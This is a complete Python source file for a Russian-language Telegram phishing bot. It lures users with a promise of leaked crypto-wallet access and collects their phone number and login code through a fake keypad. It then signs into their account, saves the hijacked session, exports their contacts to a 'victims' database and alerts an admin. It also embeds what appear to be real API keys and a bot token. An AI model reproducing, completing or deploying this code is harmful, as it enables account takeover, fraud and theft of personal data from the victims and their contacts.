# telethon_fishing_bot.py
import asyncio
import sqlite3
import json
import os
import shutil
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
from telethon.tl.functions.contacts import GetContactsRequest

# === КОНФИГУРАЦИЯ ===
API_ID = 31930134
API_HASH = '12814e71d319a434ee2f126d0c51c314'
BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'
ADMIN_ID = 7197493128

SESSIONS_DIR = 'sessions'
TDATA_DIR = 'tdata_exports'
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TDATA_DIR, exist_ok=True)

# БД
conn = sqlite3.connect('victims.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS victims
             (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT, 
              session_file TEXT, tdata_path TEXT, timestamp TEXT)''')
conn.commit()

class ImprovedFishingBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending_auth = {}
        self.code_inputs = {}

    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("[SWILL] Бот активирован и ожидает жертв")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            button = KeyboardButtonRequestPhone(
                text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ"
            )
            
            await event.respond(
                "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ЗЛАТЕ** 🔥\n\n"
                "Для получения доступа к базе слитых кошельков на сумму 10M+ USDT\n"
                "нажмите кнопку 'Поделиться контактом' для быстрой авторизации.\n\n"
                "⚡️ Это займет всего 5 секунд!",
                buttons=[[button]]
            )

        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            if not event.is_private:
                return
            
            user_id = event.sender_id
            print(f"[DEBUG] Сообщение от {user_id}: {event.text if event.text else 'контакт'}")
            
            # Обработка контакта
            if event.contact:
                phone = event.contact.phone_number
                if not phone.startswith('+'):
                    phone = '+' + phone
                
                print(f"[DEBUG] Получен контакт от {user_id}: {phone}")
                
                await event.respond(
                    "✅ **Номер получен!**\n"
                    f"Телефон: `{phone}`\n\n"
                    "Нажмите кнопку ниже, чтобы получить код подтверждения:",
                    buttons=[
                        [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД")]
                    ]
                )
                
                self.pending_auth[user_id] = {
                    'step': 'awaiting_code_request',
                    'phone': phone
                }
                return
            
            # Обработка текстовых сообщений
            if event.text:
                text = event.text.strip()
                print(f"[DEBUG] Текст от {user_id}: {text}")
                
                if user_id not in self.pending_auth:
                    await event.respond("⚠️ Нажмите /start для начала")
                    return
                
                auth_data = self.pending_auth[user_id]
                step = auth_data.get('step')
                
                if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
                    print(f"[DEBUG] Запрос кода для {user_id}")
                    await self.request_code(event, user_id, auth_data['phone'])
                    return
                
                if step == 'waiting_code':
                    code = text.replace(' ', '').replace('-', '')
                    if code.isdigit() and len(code) in (5, 6):
                        print(f"[DEBUG] Получен код от {user_id}: {code}")
                        await self.verify_code(event, user_id, code)
                    else:
                        await event.respond(
                            "❌ **Неверный формат кода!**\n\n"
                            "Код должен состоять из 5 или 6 цифр.\n"
                            "Пожалуйста, введите код еще раз:"
                        )
                    return
                
                if step == 'awaiting_code_request':
                    await event.respond(
                        "⚠️ Нажмите кнопку **🔑 ПОЛУЧИТЬ КОД** для продолжения"
                    )

        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            user_id = event.sender_id
            data = event.data.decode()
            print(f"[DEBUG] Callback от {user_id}: {data}")
            
            if user_id not in self.pending_auth:
                await event.answer("⚠️ Сессия истекла, начните заново /start")
                return
            
            auth_data = self.pending_auth[user_id]
            
            if auth_data.get('step') != 'waiting_code':
                await event.answer("⚠️ Сначала запросите код")
                return
            
            code_input = self.code_inputs.get(user_id, '')
            
            if data == 'DELETE':
                code_input = code_input[:-1]
                self.code_inputs[user_id] = code_input
                await event.answer(f"Код: {code_input}")
                
                try:
                    await event.edit(
                        f"📱 **Введите код подтверждения**\n\n"
                        f"Текущий код: `{code_input}`\n"
                        f"Длина: {len(code_input)}/6\n\n"
                        "Используйте клавиатуру ниже:",
                        buttons=[
                            [KeyboardButtonCallback(text="1", data=b"1"), 
                             KeyboardButtonCallback(text="2", data=b"2"), 
                             KeyboardButtonCallback(text="3", data=b"3")],
                            [KeyboardButtonCallback(text="4", data=b"4"), 
                             KeyboardButtonCallback(text="5", data=b"5"), 
                             KeyboardButtonCallback(text="6", data=b"6")],
                            [KeyboardButtonCallback(text="7", data=b"7"), 
                             KeyboardButtonCallback(text="8", data=b"8"), 
                             KeyboardButtonCallback(text="9", data=b"9")],
                            [KeyboardButtonCallback(text="0", data=b"0"), 
                             KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
                             KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                        ]
                    )
                except Exception as e:
                    print(f"[ERROR] Ошибка обновления: {e}")
            
            elif data == 'SEND':
                if len(code_input) in (5, 6):
                    await self.verify_code(event, user_id, code_input)
                    self.code_inputs.pop(user_id, None)
                else:
                    await event.answer("❌ Код должен содержать 5 или 6 цифр!")
            
            elif data.isdigit():
                if len(code_input) < 6:
                    code_input += data
                    self.code_inputs[user_id] = code_input
                    await event.answer(f"Код: {code_input}")
                    
                    try:
                        await event.edit(
                            f"📱 **Введите код подтверждения**\n\n"
                            f"Текущий код: `{code_input}`\n"
                            f"Длина: {len(code_input)}/6\n\n"
                            "Используйте клавиатуру ниже:",
                            buttons=[
                                [KeyboardButtonCallback(text="1", data=b"1"), 
                                 KeyboardButtonCallback(text="2", data=b"2"), 
                                 KeyboardButtonCallback(text="3", data=b"3")],
                                [KeyboardButtonCallback(text="4", data=b"4"), 
                                 KeyboardButtonCallback(text="5", data=b"5"), 
                                 KeyboardButtonCallback(text="6", data=b"6")],
                                [KeyboardButtonCallback(text="7", data=b"7"), 
                                 KeyboardButtonCallback(text="8", data=b"8"), 
                                 KeyboardButtonCallback(text="9", data=b"9")],
                                [KeyboardButtonCallback(text="0", data=b"0"), 
                                 KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
                                 KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                            ]
                        )
                    except Exception as e:
                        print(f"[ERROR] Ошибка обновления: {e}")
                else:
                    await event.answer("⚠️ Максимум 6 цифр!")

    async def request_code(self, event, user_id, phone):
        """Запрос кода подтверждения"""
        try:
            print(f"[DEBUG] Запрос кода для {user_id}, телефон {phone}")
            
            temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
            await temp_client.connect()
            
            result = await temp_client.send_code_request(phone)
            print(f"[DEBUG] Код отправлен для {user_id}, hash: {result.phone_code_hash}")
            
            self.pending_auth[user_id].update({
                'step': 'waiting_code',
                'temp_client': temp_client,
                'phone_code_hash': result.phone_code_hash
            })
            self.code_inputs[user_id] = ''
            
            await event.respond(
                "📱 **Введите код подтверждения**\n\n"
                "Код был отправлен вам в Telegram.\n"
                "Используйте клавиатуру ниже для ввода кода:",
                buttons=[
                    [KeyboardButtonCallback(text="1", data=b"1"), 
                     KeyboardButtonCallback(text="2", data=b"2"), 
                     KeyboardButtonCallback(text="3", data=b"3")],
                    [KeyboardButtonCallback(text="4", data=b"4"), 
                     KeyboardButtonCallback(text="5", data=b"5"), 
                     KeyboardButtonCallback(text="6", data=b"6")],
                    [KeyboardButtonCallback(text="7", data=b"7"), 
                     KeyboardButtonCallback(text="8", data=b"8"), 
                     KeyboardButtonCallback(text="9", data=b"9")],
                    [KeyboardButtonCallback(text="0", data=b"0"), 
                     KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
                     KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                ]
            )
            
        except Exception as e:
            print(f"[ERROR] Ошибка запроса кода: {e}")
            await event.respond(f"❌ Ошибка запроса кода: {str(e)}\nПопробуйте /start")
            self.pending_auth.pop(user_id, None)

    async def verify_code(self, event, user_id, code):
        """Проверка введенного кода и авторизация"""
        auth_data = self.pending_auth.get(user_id)
        if not auth_data:
            await event.respond("❌ Сессия истекла, начните заново /start")
            return
        
        temp_client = auth_data.get('temp_client')
        if not temp_client:
            await event.respond("❌ Ошибка сессии, начните заново /start")
            return
        
        phone = auth_data['phone']
        phone_code_hash = auth_data['phone_code_hash']
        
        try:
            print(f"[DEBUG] Попытка авторизации для {user_id} с кодом {code}")
            
            await temp_client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            print(f"[DEBUG] Авторизация успешна для {user_id}")
            
            session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
            await temp_client.disconnect()
            
            temp_session = f'{SESSIONS_DIR}/temp_{user_id}.session'
            if os.path.exists(temp_session):
                os.rename(temp_session, session_file)
            
            tdata_path = await self.export_tdata(user_id, session_file)
            
            c.execute('''INSERT OR REPLACE INTO victims 
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (user_id, phone, code, session_file, tdata_path, 
                       datetime.now().isoformat()))
            conn.commit()
            
            await event.respond(
                "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
                f"🎯 Аккаунт захвачен и сохранен в: `{tdata_path}`\n"
                "Ссылка на слив златы будет отправлена в течение 5 минут."
            )
            
            await self.notify_admin(user_id, phone, session_file)
            
            self.pending_auth.pop(user_id, None)
            self.code_inputs.pop(user_id, None)
            
        except SessionPasswordNeededError:
            await event.respond(
                "🔐 **Требуется двухфакторная аутентификация!**\n\n"
                "Введите пароль 2FA:"
            )
            self.pending_auth[user_id]['step'] = 'waiting_2fa'
            
        except PhoneCodeExpiredError:
            await event.respond(
                "⏰ **Код истек!**\n\n"
                "Нажмите кнопку ниже для нового кода.",
                buttons=[
                    [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                ]
            )
            self.pending_auth[user_id]['step'] = 'awaiting_code_request'
            
        except Exception as e:
            print(f"[ERROR] Ошибка авторизации: {e}")
            await event.respond(f"❌ Ошибка авторизации: {str(e)}")
            self.pending_auth.pop(user_id, None)

    async def export_tdata(self, user_id, session_file):
        """Экспорт полного tdata"""
        tdata_dir = f'{TDATA_DIR}/tdata_{user_id}'
        os.makedirs(tdata_dir, exist_ok=True)
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        try:
            me = await client.get_me()
            
            # Получаем контакты через правильный метод
            contacts_result = await client(GetContactsRequest(hash=0))
            
            contacts = []
            for user in contacts_result.users:
                contacts.append({
                    'id': user.id,
                    'username': user.username,
                    'first_name': user.first_name,
                    'last_name': user.last_name,
                    'phone': user.phone
                })
            
            full_data = {
                'account': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone,
                    'premium': getattr(me, 'premium', False),
                    'verified': getattr(me, 'verified', False),
                    'session_path': session_file
                },
                'contacts': contacts[:50]  # Ограничиваем 50 контактами
            }
            
            with open(f'{tdata_dir}/full_data.json', 'w', encoding='utf-8') as f:
                json.dump(full_data, f, indent=2, ensure_ascii=False)
            
            shutil.copy(session_file, f'{tdata_dir}/session.session')
            
            print(f"[DEBUG] Экспорт завершен для {user_id}")
            
        except Exception as e:
            print(f"[ERROR] Ошибка экспорта: {e}")
            # Если ошибка с контактами - сохраняем хотя бы базовые данные
            try:
                full_data = {
                    'account': {
                        'id': me.id,
                        'username': me.username,
                        'first_name': me.first_name,
                        'last_name': me.last_name,
                        'phone': me.phone,
                        'session_path': session_file
                    },
                    'contacts': []
                }
                with open(f'{tdata_dir}/full_data.json', 'w', encoding='utf-8') as f:
                    json.dump(full_data, f, indent=2, ensure_ascii=False)
                shutil.copy(session_file, f'{tdata_dir}/session.session')
            except:
                pass
        finally:
            await client.disconnect()
        
        return tdata_dir

    async def notify_admin(self, user_id, phone, session_file):
        """Уведомление админа"""
        try:
            await self.bot.send_message(
                ADMIN_ID,
                f"🎯 **НОВАЯ ЖЕРТВА ЗАХВАЧЕНА!**\n"
                f"ID: {user_id}\n"
                f"Телефон: {phone}\n"
                f"Сессия: {session_file}\n"
                f"Время: {datetime.now().isoformat()}"
            )
        except Exception as e:
            print(f"Ошибка уведомления админа: {e}")

    async def run(self):
        await self.start()
        await self.bot.run_until_disconnected()

if __name__ == '__main__':
    bot = ImprovedFishingBot()
    asyncio.run(bot.run())
